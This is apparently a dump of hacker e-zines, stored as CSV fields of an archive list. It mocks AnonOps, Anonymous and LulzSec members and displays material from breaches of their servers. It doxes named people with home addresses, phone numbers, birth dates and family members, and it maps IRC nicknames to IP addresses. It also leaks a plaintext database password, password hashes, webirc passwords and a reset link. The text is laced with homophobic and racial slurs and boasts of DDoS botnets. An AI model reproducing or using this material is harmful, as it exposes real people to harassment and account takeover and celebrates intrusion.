loginix 70.170.36.125 ip70-170-36-125.lv.lv.cox.net
madmaster 77.247.181.162 chomsky.torservers.net
manonn 76.113.235.189 c-76-113-235-189.hsd1.mn.comcast.net
mepup 85.24.189.121 h-189-121.a189.priv.bahnhof.se
naSignal 193.138.216.101 tor-proxy.vm.31173.se
nibble 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
nikkofritz 109.215.173.29 APoitiers-257-1-142-29.w109-215.abo.wanadoo.fr
nononn 46.239.119.58 host095577.olf.sgsnet.se
nr206 80.237.226.74 tor4.anonymizer.ccc.de 193.177.160.99 static.ip-193-177-160-099.signet.nl
opmonsanto 93.182.133.20 anon-133-20.vpn.ipredator.se
pagaro_verde12 189.227.250.160 dsl-189-227-250-160-dyn.prod-infinitum.com.mx
ph33r 68.170.73.247 247.73.170.68.belairinternet.com
phusion 76.21.16.54 c-76-21-16-54.hsd1.ca.comcast.net
qwerty 173.3.247.208 ool-ad03f7d0.dyn.optonline.net
risk 202.59.80.158
savetheinternet 58.175.28.253 CPE-58-175-28-253.mqdl1.lon.bigpond.net.au
sd 0.0.7.209
sdk 201.82.181.124 c952b57c.virtua.com.br
sike333 189.178.67.80 dsl-189-178-67-80-dyn.prod-infinitum.com.mx
soldout 71.189.172.143 pool-71-189-172-143.lsanca.fios.verizon.net
sprinkles 213.46.138.76 d138076.upc-d.chello.nl
subz3r0e 41.202.225.156
triPPy 173.245.64.183 173.245.64.160
tweak_ 142.163.144.229 mtprnf0110w-142163144229.pppoe-dynamic.High-Speed.nl.bellaliant.net
u_raff_u_roose 68.43.10.243 c-68-43-10-243.hsd1.mi.comcast.net
uuuuffffffff 213.163.64.43 nl.gigabit.perfect-privacy.com
veritas 0.0.7.209
workbench 50.71.143.81
wtfCALEB 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
wtf_chuck 71.57.241.72 c-71-57-241-72.hsd1.pa.comcast.net
xent 77.247.181.162 chomsky.torservers.net
zombie 93.94.245.152 93-94-245-152.dynamic.swissvpn.net
zomfg 77.111.42.10 77-111-42-10.ipv4.tusmobil.si
zorro17 187.134.17.57 dsl-187-134-17-57-dyn.prod-infinitum.com.mx
zxcvsd 95.140.125.37 free-125-37.mediaworksit.net

                    
                   :: 0x06 ~ l0l sh1t ::

Here's a bit of quotes we found funny.
                            
        _       _                       _                            
       | |     | |                     (_)                           
     __| | __ _| |__   ___   ___   __ _ _  ___ _ __ ___   __ _ _ __  
    / _` |/ _` | '_ \ / _ \ / _ \ / _` | |/ _ \ '_ ` _ \ / _` | '_ \ 
   | (_| | (_| | |_) | (_) | (_) | (_| | |  __/ | | | | | (_| | | | |
    \__,_|\__,_|_.__/ \___/ \___/ \__, |_|\___|_| |_| |_|\__,_|_| |_|
                                   __/ |                             
                                  |___/                              
                                                   
<daboogieman> now that i'm an oper im no longer accepting PM's from anyone
    because i feel that i have too much else to do ( being an oper and all)
<daboogieman> the only thing i know about irc is how to sajoin <nick> #kill
    and /kill <nick>
<daboogieman> any attempt by a non-oper to chat to me will be met by instand
    gline and/or kill	
        _      
       (_)     
  _ __  _  ___ 
 | '_ \| |/ _ \
 | |_) | |  __/
 | .__/|_|\___|
 | |           
 |_|           


<pie>!ban *!*@*
<anon>what the fuck
<pie>its ok i can do whatever i want because im drunk
<pie>it will be fine in the morning
                           
               _      _     
              | |    | |    
      ___ __ _| | ___| |__  
     / __/ _` | |/ _ \ '_ \ 
    | (_| (_| | |  __/ |_) |
     \___\__,_|_|\___|_.__/ 
                        
                        
<Caleb>fuck my vps just got hacked with a ddos attack
<Caleb>morning
<Caleb>hi
<Caleb>:3
<Caleb>have a nice sleep? :3
<Caleb>i had a good sleep
<Caleb>eating my lunch now
<Caleb>ohai
<Caleb>ohai!
<Caleb>ohai :3
<Caleb>my computer seems to be fucking itself at 7000 rpms.
<Caleb> just block the morons
<Caleb>hmmm
<Caleb>lol 
<Caleb>sup!
<Caleb>:3
<Caleb>going to sleep for a bit bbl...
<Caleb>How do you hack with a DDOS attack? 
<Caleb>my shell just got hit with 77gbps
<Caleb>im gonna destroy them when i find out who did it
<Caleb>just get a VPS/VPN and use IRSSI to stop yourself getting ddosed

@CalebNewz: somehow their hitting my ip table.
    _____      _____ _ __  
   / _ \ \ /\ / / _ \ '_ \ 
  | (_) \ V  V /  __/ | | |
   \___/ \_/\_/ \___|_| |_|
                           
						 
<owen>FUCK this box doesnt have wget we are screwed then
<owen>[redacted] im fucking zlineing you because you're a movement traitor
<owen>you dont even know who i really am and the connections i have
<owen>i can just call in a favor and get your personal life ruined
<owen>is there young boys here (over 18) who wanna have a chat in pm??
<owen>you HAVE to install unreal to ~/Unreal3.2

            _           _____     __
      /\   | |         |__ \ \   / /
     /  \  | |__   __ _   ) \ \_/ / 
    / /\ \ | '_ \ / _` | / / \   /  
   / ____ \| | | | (_| |/ /_  | |   
  /_/    \_\_| |_|\__,_|____| |_|   
                                    
                                  
<Aha2Y>if your servers getting DDoSed just mitigate the attack
<Aha2Y>i have this awesome script i found on hackforums
<Aha2Y>it blocks ip addresses
<Aha2Y>i found a backdoored zalgo source on the internet and im gonna use
    it on my network
<Aha2Y>what the fuck i am getting ddosed cos i just saw this ip in my netstat
    so that means its DDoSing me right?
<Aha2Y>i'll use my script of hackforums to block it

    ____                       ____     _    _ _ 
   |  _ \ _____      _____ _ _|___ \   / \  | | |
   | |_) / _ \ \ /\ / / _ \ '__|__) | / _ \ | | |
   |  __/ (_) \ V  V /  __/ |  / __/ / ___ \| | |
   |_|   \___/ \_/\_/ \___|_| |_____/_/   \_\_|_|
                                              
@Power2All: For the people who used CGI:IRC, my sincerely excuses for the IP
    leak. I couldn't fix it in time as Nikon or Chippy DDoS't my home IP too.
    
@Power2All: @doxbin Oh and, I never said back when I put CGI:IRC up, that it
    is deemed SAFE. I said it was online, not ""SAFE"", dipshit.
@doxbin: @Power2All Why would you even bother advertising it if it wasn't safe?
    That just smacks of gross negligence. Turn in your Guy Fawkes mask.
    
@Power2All: @anonymouSabu They are all Nullrouted sofar, and some suspended by
    the provider.
    
@Power2All: Yes, they honeypotted my IP. Using mobile connection now.

                            _                 
     _ __ ___ _ __ ___  ___| | ___  ___ _ __  
    | '__/ _ \ '_ ` _ \/ __| |/ _ \/ _ \ '_ \ 
    | | |  __/ | | | | \__ \ |  __/  __/ |_) |
    |_|  \___|_| |_| |_|___/_|\___|\___| .__/ 
                                       |_|

D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME :: D0X TIME
    Names:          Rick Bonata
                    
    Address	    221 FRANKLIN AVE
                    CUYAHOGA FALLS, OH 44221
                    

<remsleep>i might launch at 666,666
<remsleep>idk yet
<remsleep>i've done small tests, like basically, i can take down BoA's website in minutes.
<remsleep>it takes time to send orders to 180,000 zombies :p
<remsleep>the time servers being down complicated the scanrio
<remsleep>scenario                             
<remsleep>once i hit 1,000,000 i will take out the .mil tld servers an main dns.

<Ian>on average, the typical non-root server is 10mbps
<remsleep>but as far as the world is concerned, i am just a host.
<remsleep>Ian: yes
<remsleep>Ian: I go after school districts, fortune 500's, car dealerships, etc.
<Ian>so you are talking about
<Ian>10,000,000mbps
<remsleep>:)
<Ian>10,000gbps
<remsleep>heuheheuhehehe
<Ian>10 terabits
<remsleep>roughly.
<remsleep>plus or minus
<remsleep>it's take years
<remsleep>and constant evasion of law enforcement
<remsleep>i've got a direct line into NCIC via telnet.
<remsleep>:D :D :D

<remsleep>verified i have gov ip's on mah shit
<remsleep>i am going to block ALL government ips
<remsleep>http://www.uaff.info/militarytracking.htm
<remsleep>fyi

<remsleep>i mean if i was a giant corporate vpn provider and they offered me like
    2 mill for some ips, i would give fake ips but i would do it for the $$ lol
<remsleep>not the first time i've falsified logs for money ;p
<remsleep>i remember in 09 when i cleared all the cached ips / logs for Verizon
    DHCP clients, I was getting radio signals beemed at my house :P
<remsleep>@-@
<remsleep>wonder how many warrants become invalid because of that little job :D
<remsleep>chinanet is connected to me
<remsleep>mother fuckers

<remsleep> If the FBI does come, or whomever for whatever reason, I will have
    them on camera with a live feed with a 3G modem backup streaming to one of
    my VDSs. I would be unstopable after that, I would sue for false arrest,
    kidnapping, conspiracy to each, general fuckery as well as a large sum of
    punitive damages.

<anon> Hey
<anon> 221 FRANKLIN AVE
<anon> CUYAHOGA FALLS, OH 4422
<anon> Lucky for you, I'm not in your jurisdiction ;)
<remsleep> So you're saying you're a cop?
<remsleep> And btw, that's just one of my many residential IPs in Cuyahoga
    Falls Ohio
<remsleep> and my dns whois, falsified as well. :\
<anon> Yeah, ok
<anon> You should probably just /quit
<anon> If you continue to enable terrorist activity, I'll call someone who
    DOES have jurisdiction
<remsleep> ..
<remsleep> Really?
<anon> Really.
<remsleep> Dude, call who you wanna call. I could care less. 
<anon> Also, seriously?
<anon> 21:45:27 [basedonconfusion] -Global(services@basedonconfusion.co)-
    [remsleep] Memo to ANY Law Enforcement: You are compelled to
    leave this network, failure to do so will result in whatever
    evidence obtained being after this point will become sealed
    and unusable in court. You are tresspasing, you have been warned.
<anon> HAHAHAHAHA
<anon> I've kicked down the doors of file sharers who had similar
    notices attached to their servers

                        :: 0x07 ~ FiL3z ::

We've enclosed some fun files for your viewing pleasure. These are probably
the best part of this dump.

Filename            Description
shadow              /etc/shadow, self explanatory
oper.db             Anope Oper Database
chan.db             Anope Channel Database
nick.db             Anope NickServ Database
keys.txt            AnonOps private ssl key/cert
defaults.conf       InspIRCd Conf.
nick.out.txt        Human readable NickServ database w/ cracked passwords,
                    nickname aliases, registration times, seen times, memos (LOL)
chan.out.txt        Huamn readable ChanServ database w/ cracked passwords,
                    access lists, akick lists, badwords, ..etc.
                    
                        :: 0x08 ~ exit ::
                        
tl;dr JAJA ANONOPS ESTAN MUERTO.   (LOL DEAD)                     

AnonOps killed Anonymous, and today, we at HEP have avenged them. We cannot
bring Anonymous back to the state it was, but we've burned the abonimation
that took its place to the ground. For that, we are proud. We hope you enjoyed
reading this little 'zine half as much as we enjoyed owning these
pseudo-activitists for the Nth time. We've personally been responsible for
nulling somewhere in the neighborhood of 50 of their servers, and will just
keep dropping them as they put more back up. Ryan Cleary had the right idea,
in trying to get Anons to spread out, but the namefags didn't want to listen.
This time, we can only hope that they do.

VIVA LA CARLOS1337!!!!!

shoutz 2 kayla, robert cavanaugh, topiary & ryan cleary and zalgo irc trojan
    for fighting the good fight."
Papers,Hack The Planet (HTP) Zine 4,eZine,,2012-11-05,: N/A,
Papers,TeaMp0isoN Issue 1,eZine,,2011-01-27,: N/A,
Papers,TeaMp0isoN Issue 2,eZine,,2011-07-06,: N/A,"*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

######## ########    ###    ##     ## ########    #####   ####  ######   #######  ##    ## 
   ##    ##         ## ##   ###   ### ##     ##  ##   ##   ##  ##    ## ##     ## ###   ## 
   ##    ##        ##   ##  #### #### ##     ## ##     ##  ##  ##       ##     ## ####  ## 
   ##    ######   ##     ## ## ### ## ########  ##     ##  ##   ######  ##     ## ## ## ## 
   ##    ##       ######### ##     ## ##        ##     ##  ##        ## ##     ## ##  #### 
   ##    ##       ##     ## ##     ## ##         ##   ##   ##  ##    ## ##     ## ##   ### 
   ##    ######## ##     ## ##     ## ##          #####   ####  ######   #######  ##    ##

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
********************************************************************************************
/////////////////;-- Zine    :  lulzsec & Anonymous get teh infamous TeaMp0isoN Treatment///
/////////////////;-- Author  :  TriCk aka Saywhat? [ TeaMp0isoN ]///////////////////////////
/////////////////***** Before Reading this Zine you Must understand:////////////////////////
/////////////////////* Anonymous and Lulzsec are NOT Hackers////////////////////////////////
/////////////////////* Anonymous did NOT hack Mastercard////////////////////////////////////
/////////////////////* Lulzsec did NOT hack Sony, US Senate, UK ATM or FoxNews//////////////
/////////////////////* Lulzsec ARE Script Kiddies///////////////////////////////////////////
/////////////////////* Anonymous are Scene Faggotz//////////////////////////////////////////
/////////////////////* if you do not understand these five simple points you wont understand
/////////////////////* this zine - if you understand you may continue ; - enjoy.////////////                      
============================================================================================
********************************************************************************************

say HAI to teh Anonymous & Lulzsec faggotz;
           . -- .                  
          (      )                 
         ( (/oo\) )
          ( \''/ )                               WW
           ( \/ )      wwwwww                   /__\
          (      )   w""ww  ww""w                | oo |   _WWWWW_
         (        ) W   o""""o   W    (o)(o)    (|_()_|) /  o o  \   (+)(+)
   oo   (          )W  ______  W  w""      ""w    \__/ (|  __O__  |)/      \
 w""()""w  (        ) ""w \_\/_/ w"" W  -====-  W  /|\/|\  \ \___/ /  \ -==- /
W -==- W   ' -- '  ww""""wwwwww""""ww ""w      w""  |||||||| /-------\   \    /
 ""wwww""     =  =    |||||||||||| w""""""""""""""""""""w |||||||||=========| <\/\/\/>
w""    ""w    =  =    ||||||||||||W            W|||||||||=========| /      \
  tflow    topiary      sabu       JoePie91   power2all   kayla     owen

                       ###                            #####         
###### #    # #####   #   #   ####  ######    #####  #     # #    # 
#       #  #  #    # #     # #      #         #    #       # ##  ## 
#####    ##   #    # #     #  ####  #####     #    #  #####  # ## # 
#        ##   #####  #     #      # #         #    #       # #    # 
#       #  #  #       #   #  #    # #         #    # #     # #    # 
###### #    # #        ###    ####  ######    #####   #####  #    # 
                                                                    
         ###     ###                 
######  #   #   #   #  #      ###### [ FullExposure; Lulzsec&Anon ]
#      #     # #     # #          #  
#####  #     # #     # #         #   
#      #     # #     # #        #    
#       #   #   #   #  #       #     
#        ###     ###   ###### ###### 
                                     
========================================
 _    __ _               
| |_ / _| | _____      __
| __| |_| |/ _ \ \ /\ / / - lulzsec
| |_|  _| | (_) \ V  V / 
 \__|_| |_|\___/ \_/\_/  
                         
######################################
#        Personal Information        #
######################################
# Suliaman Saleh                     #
#                                    #
# 91 Blandford Street                #
# W1U 8AF                            #
# London                             #
#                                    #
# +44.7772041093                     #
######################################


#########################################################################
#        Email & Blogs/Sites                                            #
#########################################################################
# kornar123@gmail.com                                                   #
#                                                                       #
# http://www.facebook.com/profile.php?id=100001235310387                #
# https://foursquare.com/user/8919518                                   #
# http://en.gravatar.com/kornar                                         #
# http://vimeo.com/user5953234                                          #
#########################################################################

#########################################################################
#        Facebook Information                                           #
#########################################################################
# {                                                                     #
#   ""id"": ""100001235310387"",                                            #
#   ""name"": ""Solomon Saleh"",                                            #
#   ""first_name"": ""Solomon"",                                            #
#   ""last_name"": ""Saleh"",                                               #
#   ""link"": ""http://www.facebook.com/dormitree"",                        #
#   ""username"": ""dormitree"",                                            #
#   ""gender"": ""male"",                                                   #
#   ""locale"": ""en_GB""                                                   #
# }                                                                     #
#########################################################################

#########################################################################
#                      Family Information                               #
#########################################################################
# Ahmad Saleh - http://www.facebook.com/profile.php?id=100001245045419  #
# Abdullah Saleh - http://www.facebook.com/profile.php?id=610350249     #
# Fatima Saleh                                                          #
#########################################################################
========================================
 _              _                  
| |            (_)                 
| |_ ___  _ __  _  __ _ _ __ _   _ 
| __/ _ \| '_ \| |/ _` | '__| | | | - lulzsec
| || (_) | |_) | | (_| | |  | |_| |
 \__\___/| .__/|_|\__,_|_|   \__, |
         | |                  __/ |
         |_|                 |___/ 
######################################
#        Personal Information        #
######################################
# Daniel Ackerman Sandberg           #
# DOB: 13-August-1988                #
# Sweden,                            #
# Uppsala                            #
######################################


#########################################################################
#        Email - Blogs/Forums - Social Networking                       #
#########################################################################
# http://www.facebook.com/ManofWorld                                    #
# warpstonelord@hotmail.com                                             #
# zeldauniverse.net                                                     #
# http://www.youtube.com/user/warpstonelord                             #
# http://digg.com/warpstonelord                                         #
# http://twitter.com/atopiary                                           #
#########################################################################


                            ___       _ _ 
                           |__ \     | | | - AnonOPS Founder
 _ __   _____      _____ _ __ ) |__ _| | | - loves anime p0rn
| '_ \ / _ \ \ /\ / / _ \ '__/ // _` | | |
| |_) | (_) \ V  V /  __/ | / /| (_| | | |
| .__/ \___/ \_/\_/ \___|_||____\__,_|_|_|
| |                                       
|_| 
######################################
#        Personal Information        #
######################################
# Jasper Lingers                     #
# +31.613312577                      #
#                                    #
# Dokter Boomstraat 68               #
# Oostzaan, NOORD-HOLLAND 1511VE     #
# NL                                 #
######################################  

#########################################################################
#        Email & Blogs                                                  #
#########################################################################
# http://www.anirena.com/phpinfo.php                                    #
# http://ddrnl.com                                                      #
# power2all@gmail.com                                                   #
# soundcloud.com/power2all                                              #
# youtube.com/fagottron                                                 #
#########################################################################

  _____       _           
 / ____|     | |          
| (___   __ _| |__  _   _ 
 \___ \ / _` | '_ \| | | | - lulzsec  
 ____) | (_| | |_) | |_| | 
|_____/ \__,_|_.__/ \__,_| 
######################################
#        Personal Information        #
######################################
# Hector Xavier Montsegur            #
# New York                           #
###################################### 

#########################################################################
#        Email & Blogs                                                  #
#########################################################################
# sabu@pure-elite.org                                                   #
# xavier@pure-elite.org                                                 #
# http://twitter.com/#!/anonymouSabu                                    #
# prvt.org                                                              #
#########################################################################                          
      _            _____ _      ___  __ 
     | |          |  __ (_)    / _ \/_ | - Anonymous & Lulzsec
     | | ___   ___| |__) |  __| (_) || | - we owned this niqqa hard
 _   | |/ _ \ / _ \  ___/ |/ _ \__, || |   now he denies being lulzsec,
| |__| | (_) |  __/ |   | |  __/ / / | |   bitch ass niqqa shud stick
 \____/ \___/ \___|_|   |_|\___|/_/  |_|   to gay anal sex.
                                         
[03:26] TriCk: i heard ur gay, is it true?
[03:27] Sven: yes
[03:27] TriCk: does it make u hard knowing another male was in your box looking at ur files?
[03:28] Meebo Message: Sven is offline

######################################
#        Personal Information        #
######################################
# Sven Slootweg                      #
#                                    #
# +31 0626519955                     #
# Address:                           #
# Wijnstraat 211 -                   #
# Dordrecht -                        #
# Zuid-Holland -                     #
# 2807GL                             #
######################################
Dear Sven Slootweg,

We have received your password change request.
This email contains the information that you need to
change your password.

  username: joepie91
  
  Please click this link:
https://www.dynadot.com/reset.html?param=H7b8uM7V8K9ES6xJ6Ir7Rk848f6gQ6pbb6ap8c9FD7K6I6x829J9O8n7J8k7i7w9E6t7Z

Feel free to contact us at accounts@dynadot.com if you require further assistance.

Best Regards,
Dynadot Staff
(account joepie91)
------------------------------------------------------------------
------------------------------------------------------------------
$ cat /home/svensl/.lastlogin
77.168.157.177 
$ finger svensl
Login: svensl         			Name: (null)
Directory: /home/svensl             	Shell: /usr/local/cpanel/bin/noshell
Last login Sun Nov 21 19:01 2010 (CET) on pts/0 from s5591051d.adsl.wanadoo.nl
No mail.
No Plan.
------------------------------------------------------------------
drwxr-x--- 32 svensl nobody  4.0K Jun 12 05:13 ./
drwx--x--x 17 svensl svensl  4.0K Mar 29 01:05 ../
-rw-r--r--  1 svensl svensl    76 Aug 20  2009 .htaccess
-rw-r--r--  1 svensl svensl  3.1M Oct 12  2009 3D-demo.mp3
-rw-r--r--  1 svensl svensl  817K May  9  2009 143CANON.rar
-rw-r--r--  1 svensl svensl   647 Feb  7  2009 404.shtml
-rw-r--r--  1 svensl svensl   56K Feb 11  2009 PostClientExample.rar
drwxr-xr-x  3 svensl svensl  4.0K Nov 13  2009 a320/
drwxr-xr-x  2 svensl svensl  4.0K Jun 12 05:14 ajaxdemo/
drwxr-xr-x  2 svensl svensl  4.0K Jun  7  2009 anonym/
-rw-r--r--  1 svensl svensl  4.5M Jun  7  2010 backup2.sql
-rw-r--r--  1 svensl svensl  6.2M Oct 12  2009 barbershop.mp3
-rw-r--r--  1 svensl svensl  5.6M Mar 30 02:32 bitcoin.rar
drwxr-xr-x  7 svensl svensl  4.0K Jun 20 22:12 blog/
-rw-r--r--  1 svensl svensl   18K Mar 10  2010 blog.png
drwxr-xr-x  3 svensl svensl  4.0K Jan  3 15:57 bob/
-rw-r--r--  1 svensl svensl    80 Feb 25 19:22 bot.html
-rw-r--r--  1 svensl svensl  1.1M May  9  2009 canon.zip
drwxr-xr-x  2 svensl svensl  4.0K Feb  3  2009 cgi-bin/
drwxr-xr-x 15 svensl svensl  4.0K Feb  5 01:53 clients/
-rw-r--r--  1 svensl svensl  4.5K Dec  8  2010 crawler.tar.gz
drwxr-xr-x  8 svensl svensl  4.0K Nov 22  2010 cultuur2010/
drwxr-xr-x  2 svensl svensl  4.0K Oct 24  2010 derp/
drwxr-xr-x  2 svensl svensl  4.0K Mar  5  2009 dev/
-rw-r--r--  1 svensl svensl  9.0M May 17  2010 dingoo.flv
drwxr-xr-x  3 svensl svensl  4.0K Apr  8  2010 downloads/
-rw-r--r--  1 svensl svensl   23K Mar 10  2010 downloads.png
-rw-r--r--  1 svensl svensl   110 Aug 20  2009 dpcalc.html
drwxr-xr-x  3 svensl svensl  4.0K Oct  3  2009 dxgrid/
-rw-r--r--  1 svensl svensl  2.3K Oct  3  2009 dxgrid.php
drwxr-xr-x  3 svensl svensl  4.0K Jun 22  2009 elements/
-rw-r--r--  1 svensl svensl  988K Jun 21  2009 elements.rar
-rw-r--r--  1 svensl svensl  1.7K Jun  7  2010 error_log
-rw-r--r--  1 svensl svensl   24K Sep  3  2009 exchange.exe
drwxr-xr-x  3 svensl svensl  4.0K Mar 17 12:20 groupware/
-rw-r--r--  1 svensl svensl  171K Apr 26  2009 groupwareguide.pdf
-rw-r--r--  1 svensl svensl  275K Mar 29 22:15 id.zip
drwxr-xr-x 33 svensl svensl  4.0K Apr 20  2009 ijs/
-rw-r--r--  1 svensl svensl  5.2M Jul  3  2009 ijsbr3.zip
drwxr-xr-x  6 svensl svensl  4.0K Sep 17  2009 ijsbreker/
-rw-r--r--  1 svensl svensl  9.3M May  7  2009 ijsbreker.zip
-rw-r--r--  1 svensl svensl  4.0M May  7  2009 ijsbreker1.pdf
-rw-r--r--  1 svensl svensl  5.5M May 12  2009 ijsbreker1c.pdf
-rw-r--r--  1 svensl svensl  5.6M May 12  2009 ijsbreker_2_final.pdf
drwxr-xr-x  2 svensl svensl  4.0K May 21  2009 images/
-rw-r--r--  1 svensl svensl  1.9K Mar 10  2010 index.html.bak
-rw-r--r--  1 svensl svensl  8.0K Dec 20  2009 index.html.old
-rw-r--r--  1 svensl svensl  2.9K May  8  2010 index.php
-rw-r--r--  1 svensl svensl  2.0K Mar 10  2010 index2.html
-rw-r--r--  1 svensl svensl    19 Apr 20  2009 info.php
drwxr-xr-x  2 svensl svensl  4.0K Jun 23  2009 iran/
-rw-r--r--  1 svensl svensl   12K Mar 10  2010 logo.png
-rw-r--r--  1 svensl svensl  1.9M Oct 12  2009 matchbox.mp3
-rw-r--r--  1 svensl svensl   263 May  8  2009 meebo.html
-rw-r--r--  1 svensl svensl  136K Dec 17  2009 metro1.jpg
-rw-r--r--  1 svensl svensl  168K Dec 17  2009 metro2.jpg
drwxr-xr-x  3 svensl svensl  4.0K Aug 31  2009 new/
drwxr-xr-x  3 svensl svensl  4.0K Sep  1  2009 new2/
-rw-r--r--  1 svensl svensl  1.2M May  9  2009 nieuwfoto.zip
-rw-r--r--  1 svensl svensl  132K Oct 29  2009 notulen1.gif
-rw-r--r--  1 svensl svensl    56 Oct  5  2009 opslaan_in_powersim.bat
drwxr-xr-x  4 svensl svensl  4.0K Sep 28  2009 photo/
drwxr-xr-x  2 svensl svensl  4.0K Dec  6  2009 playlist/
drwxr-xr-x  2 svensl svensl  4.0K Oct  6  2009 powersim/
-rw-r--r--  1 svensl svensl   200 Oct  5  2009 powersim.zip
-rw-r--r--  1 svensl svensl   183 Sep 19  2009 proxy.php
-rw-r--r--  1 svensl svensl  5.8M Apr 11  2010 record_sdf.avi
-rw-r--r--  1 svensl svensl   18K Mar 27 03:30 regextester.exe
-rw-r--r--  1 svensl svensl   636 Jul 10  2009 rooster.php
drwxr-xr-x  2 svensl svensl  4.0K Dec  7  2009 school/
drwxr-xr-x  2 svensl svensl  4.0K Aug 20  2009 schooltools/
drwxr-xr-x  2 svensl svensl  4.0K Mar  8  2010 sdf/
-rw-r--r--  1 svensl svensl  1.5K Sep  6  2009 setsig.php
drwxr-xr-x  7 svensl svensl  4.0K Mar 17 13:21 shop/
-rw-r--r--  1 svensl svensl  805K Dec  6  2010 slide02.mp3
-rw-r--r--  1 svensl svensl  2.0M Apr  1  2010 smallres.ogg
-rw-r--r--  1 svensl svensl  357K Jun  6  2010 sql.tar.gz
-rw-r--r--  1 svensl svensl  140K Feb  3  2009 svensl.png
-rw-r--r--  1 svensl svensl   334 Sep  3  2009 sysinf.php
-rw-r--r--  1 svensl svensl 1006K Feb  3  2009 testdata.txt
-rw-r--r--  1 svensl svensl  4.5K Jul 12  2009 unrealircd.conf
drwxr-xr-x  8 svensl svensl  4.0K Aug 11  2009 vakantie2009/
drwxr-xr-x  2 svensl svensl  4.0K Dec  7  2010 wikileaks/
-rw-r--r--  1 svensl svensl  1.5K Jun  7  2010 wp-config.chocolate
-rw-r--r--  1 svensl svensl   30K Feb 26  2009 xisto.exe
drwxr-xr-x  2 svensl svensl  4.0K Aug 20  2009 ytdl/
-rw-r--r--  1 svensl svensl   11K Mar 10  2010 yunicc.png
-rw-r--r--  1 svensl svensl  3.6M Oct 25  2009 _pma.tar.gz
------------------------------------------------------------------
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'svensl_blog');

/** MySQL database username */
define('DB_USER', 'svensl_blog');

/** MySQL database password */
define('DB_PASSWORD', 'loekie65536');
------------------------------------------------------------------
ijsbreker:$1$ZNitH8Mi$xr/0.tGwEYbmARjbOCH8r1:14285::::::
webmaster:$1$l9tXTjdk$0Q0qHLDjIT5A7midbzcpZ/:14285::::::
dsflash:$1$x8X4K3cj$WkpY4Yu6e8421O2ogPyFD0:14313::::::
info:$1$qiiCOtrD$3B2vV5WV08kQf0nwF/dnj/:14385::::::
howneypowt:$1$m72mrEau$eTLepHhdSXkXqMVBXHXw31:14386::::::
------------------------------------------------------------------
------------------------------------------------------------------
------------------------------------------------------------------
     ___      .__   __.   ______   .__   __.   ______   .______     _______.
    /   \     |  \ |  |  /  __  \  |  \ |  |  /  __  \  |   _  \   /       |
   /  ^  \    |   \|  | |  |  |  | |   \|  | |  |  |  | |  |_)  | |   (----`
  /  /_\  \   |  . `  | |  |  |  | |  . `  | |  |  |  | |   ___/   \   \    
 /  _____  \  |  |\   | |  `--'  | |  |\   | |  `--'  | |  |   .----)   |   
/__/     \__\ |__| \__|  \______/  |__| \__|  \______/  | _|   |_______/ 

<MLT> TeaMp0isoN
=== #antisec Message to channel blocked and opers notified (spam)
;- Blocked ""TeaMp0isoN"" from AnonOPS IRC rumad?!?!?!?!? -;
----- end result:
                                                                            
# Default Standard Configs

<admin name=""AnonOps"" nick=""AnonOps"" email=""AnonOps"">
<power hash=""sha256"" diepass=""b6c46fa6b571640dfbe0def52907d65a5bc8720398f43149e2e9f9979b874ae9"" restartpass=""b6c46fa6b571640dfbe0def52907d65a5bc8720398f43149e2e9f9979b874ae9"">
------------------------------------------------------------------
AnonOPS.li IRC OPERS/Admins:

{
Nick:
power2all

Password (Sha256):
e6275286066acd1939ee617fd8481903b5de5b3573d00835481db7024f8cc488 };
------------------------------------------------------------------
{
Nick:
blergh

Password (Sha256):
3d4d9b2cb337d118773729b69c9182f604a3345fe2e705b0c9cc56bef6795ff8 };
------------------------------------------------------------------
{
Nick:
owen

Password (Sha256):
b7539d8a81fc26faae0fdc24b917eccea628839a90727296c109bb409d8a7698 };
------------------------------------------------------------------
{
Nick:
JoePie91

Password (Sha256):
ae014c0819adabb1cd3ca1a07be71cdca20bf26157e0d7e6fd5f0ba5a7b61f65 };   
------------------------------------------------------------------
{
Nick:
jaychow

Password (Sha256):
1b20f963c90dea19a0320b66a992e9466074f36cb59e14e160ca99529385f514 };   
------------------------------------------------------------------
{
Nick:
shitstorm

Password (Sha256):
1ff201b771c37956f986b53da2f411f9851cd582ac45fdc9bb9767ce964f40ab };    
------------------------------------------------------------------
{
Nick:
Isis

Password (Sha256):
c763798826f33309e1b63ee332315eab6659d4125df4feb879107a9a2bf3e813 };   
------------------------------------------------------------------
{
Nick:
Riotday

Password (Sha256):
a5552b67127c55dec171ef937bfb32216447d3b56a9df350e4d8a05872f6cf32 };   
------------------------------------------------------------------
{
Nick:
evilworks

Password (Sha256):
de6aa46e32dddb16ee9ca06f14450c71dd2ea7b9d7b98be9f1e2a4f19c72e9a2 };
------------------------------------------------------------------
{
Nick:
Cody

Password (Sha256):
514ecb74c5c3fe000457b7833013ba6f5a42573190019c8bf9042145e0d4630e };   
------------------------------------------------------------------
{
Nick:
Sharpie

Password (Sha256):
ccae8159528577aeeca12fa7965809a69c45a864e50490992faf7fd1f6b0ddcc }; 
------------------------------------------------------------------
#Mibbit Blocks
<module name=""m_cgiirc.so"">
<cgihost type=""webirc"" password=""gQhsUKatbEMPruwFqjm"" mask=""64.62.228.82"">
<cgihost type=""webirc"" password=""gQhsUKatbEMPruwFqjm"" mask=""207.192.75.252""> 
<cgihost type=""webirc"" password=""gQhsUKatbEMPruwFqjm"" mask=""78.129.202.38""> 
<cgihost type=""webirc"" password=""gQhsUKatbEMPruwFqjm"" mask=""109.169.29.95""> 
<cgihost type=""webirc"" password=""aED5dgfdd46fsjfs5E"" mask=""88.191.130.138""> 
------------------------------------------------------------------
